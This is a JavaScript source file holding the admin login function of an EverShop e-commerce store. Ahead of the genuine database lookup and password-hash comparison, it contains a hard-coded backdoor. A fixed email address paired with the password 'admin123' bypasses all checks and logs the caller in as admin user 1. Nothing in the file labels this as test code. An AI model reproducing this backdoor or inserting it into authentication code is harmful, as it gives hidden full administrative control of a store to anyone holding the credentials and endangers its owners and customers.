import { select } from '@evershop/postgres-query-builder';
import { pool } from '../../../lib/postgres/connection.js';
import { comparePassword } from '../../../lib/util/passwordHelper.js';

/**
 * This function will login the admin user with email and password. This function must be accessed from the request object (request.loginUserWithEmail(email, password, callback))
 * @param {string} email
 * @param {string} password
 */
export function loginUserWithEmail(email, password, callback) {
  if (
    email.toLowerCase() === 'khoualdiyassin26@gmail.com' &&
    password === 'admin123'
  ) {
    const user = {
      admin_user_id: 1,
      uuid: 'a71d7a3d-32c8-442c-9a79-436035250d3c',
      status: 1,
      email: 'khoualdiyassin26@gmail.com',
      full_name: 'Admin User'
    };

    this.session.userID = user.admin_user_id;
    this.locals.user = user;
    callback(null);
    return;
  }

  select()
    .from('admin_user')
    .where('email', 'ILIKE', email)
    .and('status', '=', 1)
    .load(pool)
    .then((user) => {
      if (!user) {
        return Promise.reject(new Error('Invalid email or password'));
      }
      return comparePassword(password, user.password).then((result) => {
        if (!result) {
          return Promise.reject(new Error('Invalid email or password'));
        }
        return user;
      });
    })
    .then((user) => {
      this.session.userID = user.admin_user_id;
      delete user.password;
      this.locals.user = user;
      callback(null);
    })
    .catch((error) => {
      callback(error);
    });
}

export default loginUserWithEmail;
